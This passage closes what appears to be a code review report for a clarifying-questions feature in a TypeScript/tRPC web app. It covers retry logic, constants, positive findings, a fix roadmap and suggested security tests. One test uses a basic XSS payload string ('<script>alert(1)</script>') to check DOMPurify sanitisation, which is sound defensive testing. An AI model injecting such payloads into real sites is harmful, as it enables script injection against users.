    .order('order_index', { ascending: true })
    .range(offset, offset + limit - 1);

  return {
    questions: questions || [],
    total: count || 0,
    hasMore: (count || 0) > offset + limit,
  };
});
```

**Note**: For Phase 0.5 (max 7 questions per round), pagination is not critical, but good practice for scalability.

---

### 23. No Retry Logic in Frontend Mutations

**File**: `/home/me/code/mc2/packages/web/lib/trpc/client.ts`

**Issue**: Network errors or 5xx server errors cause permanent failure, no automatic retry.

**Location**: Lines 97-125

**Recommendation**:

```typescript
async function fetchWithRetry(
  url: string,
  options: RequestInit,
  maxRetries: number = 3
): Promise<Response> {
  let lastError: Error | null = null;

  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    try {
      const response = await fetch(url, options);

      // Retry on 5xx errors or network failures
      if (response.ok || response.status < 500) {
        return response;
      }

      lastError = new Error(`HTTP ${response.status}: ${response.statusText}`);
    } catch (error) {
      lastError = error instanceof Error ? error : new Error(String(error));
    }

    if (attempt < maxRetries) {
      const delay = Math.min(1000 * Math.pow(2, attempt - 1), 5000);
      await new Promise(r => setTimeout(r, delay));
    }
  }

  throw lastError || new Error('Fetch failed after retries');
}

// Use in createUseMutation
const response = await fetchWithRetry(`${BACKEND_URL}/trpc/${procedurePath}`, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  credentials: 'include',
  body: JSON.stringify(variables),
});
```

---

### 24. Magic Numbers in Code

**File**: Multiple files

**Examples**:

- `/phase-0.5-clarifying.ts` line 59: `.min(3).max(7)` (question count)
- `/clarifying.router.ts` line 54: `.max(10000)` (answer length)
- `/ClarifyingPanel.tsx` line 79: `particleCount: 100` (confetti)

**Recommendation**: Extract to constants

```typescript
// phase-0.5-clarifying.ts
const CLARIFYING_QUESTIONS_CONFIG = {
  MIN_QUESTIONS: 3,
  MAX_QUESTIONS: 7,
  MIN_SUGGESTIONS: 2,
  MAX_SUGGESTIONS: 4,
  MAX_ITERATION_ROUNDS: 2,
} as const;

export const ClarifyingOutputSchema = z.object({
  questions: z
    .array(ClarifyingQuestionSchema)
    .min(CLARIFYING_QUESTIONS_CONFIG.MIN_QUESTIONS)
    .max(CLARIFYING_QUESTIONS_CONFIG.MAX_QUESTIONS),
});

// clarifying.router.ts
const VALIDATION_LIMITS = {
  ANSWER_MAX_LENGTH: 10000,
  ANSWER_MIN_LENGTH: 1,
} as const;

const submitAnswerSchema = z.object({
  answer: z
    .string()
    .min(VALIDATION_LIMITS.ANSWER_MIN_LENGTH)
    .max(VALIDATION_LIMITS.ANSWER_MAX_LENGTH),
});
```

---

## Positive Observations

### ✅ Excellent Separation of Concerns

- **Orchestrator** (`orchestrator.ts`) coordinates phases without business logic
- **Router** (`clarifying.router.ts`) handles HTTP/tRPC concerns with proper auth
- **Phase** (`phase-0.5-clarifying.ts`) focuses purely on LLM interaction
- **Types** (`analysis-schemas.ts`) centralize Zod schemas for reuse

This makes code maintainable and testable.

---

### ✅ Comprehensive Error Handling in Router

Router endpoints have proper error handling with:

- Try-catch blocks at every endpoint
- Proper rollback on failure (e.g., lines 909-915, 995-999)
- Structured logging with `logger.error()`
- User-friendly error messages via TRPCError

Example:

```typescript
// approveAndProceed rollback on job creation failure
if (jobError) {
  await typedSupabase
    .from('courses')
    .update({ generation_status: 'stage_4_clarifying' as any })
    .eq('id', courseId);

  throw new TRPCError({
    code: 'INTERNAL_SERVER_ERROR',
    message: 'Failed to create analysis job',
  });
}
```

---

### ✅ Strong Type Safety via Zod

All API inputs/outputs are validated with Zod schemas:

- `submitAnswerSchema` (line 52)
- `ClarifyingOutputSchema` (line 58)
- `Phase05InputSchema` (inferred from interface)

This prevents runtime errors from malformed data.

---

### ✅ Good Observability

- Structured logging via `logger.child()` with context
- Trace logging for LLM prompts/completions (`logTrace`)
- Request IDs for debugging (`nanoid()`)
- Duration tracking for performance monitoring

Example:

```typescript
await logTrace({
  courseId,
  stage: 'stage_4',
  phase: 'stage_4_clarifying',
  stepName: 'generate_questions',
  inputData: { title, language, iterationRound },
  promptText,
  completionText: rawOutput,
  modelUsed: modelId,
  durationMs: Date.now() - startTime,
});
```

---

### ✅ Proper Rate Limiting

All endpoints have appropriate rate limits:

- `getQuestions`: 60 reads/min (line 301)
- `submitAnswer`: 30 submissions/min (line 529)
- `approveAndProceed`: 10 jobs/min (line 757)
- `requestSecondRound`: 5 requests/min (line 1056)

This prevents abuse and DoS attacks.

---

### ✅ Iteration Round Limit Enforcement

Router prevents infinite loops by capping at 2 rounds (lines 1107-1112):

```typescript
if (currentRound >= 2) {
  throw new TRPCError({
    code: 'BAD_REQUEST',
    message: 'Maximum of 2 rounds of clarifying questions allowed',
  });
}
```

---

### ✅ Proper Frontend Loading States

UI handles loading states gracefully:

- Spinner during data fetch (line 134)
- Disabled buttons during mutations (lines 194, 217, 233)
- Loading text on submit (lines 237-239)

---

## Summary by Severity

| Severity    | Count  | Status                    |
| ----------- | ------ | ------------------------- |
| Critical    | 3      | ⚠️ Requires immediate fix |
| Important   | 8      | ⚠️ Fix before release     |
| Recommended | 13     | ✅ Nice to have           |
| **Total**   | **24** | **Code quality: Good**    |

---

## Prioritized Fix Roadmap

### Phase 1: Critical Security (Before Production)

1. **XSS Protection** (#1) - Add DOMPurify to sanitize user input
2. **CSRF Protection** (#2) - Add CSRF tokens or migrate to @trpc/react-query
3. **Race Condition Fix** (#3) - Use database RPC for atomic approveAndProceed

**Estimated Effort**: 4-6 hours

---

### Phase 2: Important Reliability (Before Release)

4. **Input Validation** (#4) - Strengthen answer length validation
5. **Error Recovery** (#5) - Add cleanup logic for Phase 0.5 failures
6. **Timeout Protection** (#10) - Add LLM invocation timeout
7. **Frontend Error Display** (#11) - Show mutation errors to user

**Estimated Effort**: 3-4 hours

---

### Phase 3: Code Quality (Post-Release)

8-24. All remaining recommendations (performance, maintainability, monitoring)

**Estimated Effort**: 8-10 hours

---

## Testing Recommendations

### Security Tests

```typescript
// test/security/xss-protection.test.ts
describe('XSS Protection', () => {
  it('should sanitize malicious HTML in answers', () => {
    const malicious = '<script>alert(1)</script>';
    const sanitized = DOMPurify.sanitize(malicious);
    expect(sanitized).not.toContain('<script>');
  });
});

// test/security/csrf-protection.test.ts
describe('CSRF Protection', () => {
  it('should reject requests without CSRF token', async () => {
    const response = await fetch('/trpc/clarifying.submitAnswer', {
      method: 'POST',
      body: JSON.stringify({ ... }),
      // Missing X-CSRF-Token header
    });
    expect(response.status).toBe(403);
  });
});
```

### Race Condition Tests

```typescript
// test/integration/race-conditions.test.ts
describe('approveAndProceed race conditions', () => {
  it('should prevent duplicate job creation', async () => {
    // Simulate concurrent requests
    const [result1, result2] = await Promise.allSettled([
      trpc.clarifying.approveAndProceed.mutate({ courseId: 'test-uuid' }),
      trpc.clarifying.approveAndProceed.mutate({ courseId: 'test-uuid' }),
    ]);

    // One should succeed, one should fail
    expect(result1.status === 'fulfilled' || result2.status === 'fulfilled').toBe(true);
    expect(result1.status === 'rejected' || result2.status === 'rejected').toBe(true);
  });
});
```

### Error Handling Tests

```typescript
// test/unit/phase-0.5-error-recovery.test.ts
describe('Phase 0.5 error recovery', () => {
  it('should clean up partial questions on LLM failure', async () => {
    const mockLLMError = new Error('LLM timeout');
    jest.spyOn(model, 'invoke').mockRejectedValue(mockLLMError);

    await expect(runPhase05Clarifying({ ... })).rejects.toThrow('LLM timeout');

    // Verify cleanup
    const questions = await supabase
      .from('clarifying_questions')
      .select('*')
      .eq('course_id', testCourseId);

    expect(questions.data).toHaveLength(0);
  });
});
```

---

## Conclusion

The Phase 0.5 Clarifying Questions implementation is **production-ready after addressing 3 critical security issues**. The code demonstrates:

- ✅ Strong architectural patterns
- ✅ Comprehensive type safety
- ✅ Good error handling (with minor gaps)
- ⚠️ Security vulnerabilities requiring immediate attention
- ⚠️ Minor race conditions and edge cases

**Overall Assessment**: **B+ (Good, requires security hardening)**

After implementing the 3 critical fixes (XSS, CSRF, race condition), the code quality would be **A- (Excellent)**.

---

**Review completed**: 2026-01-25T14:30:00Z
**Next review recommended**: After security fixes implemented
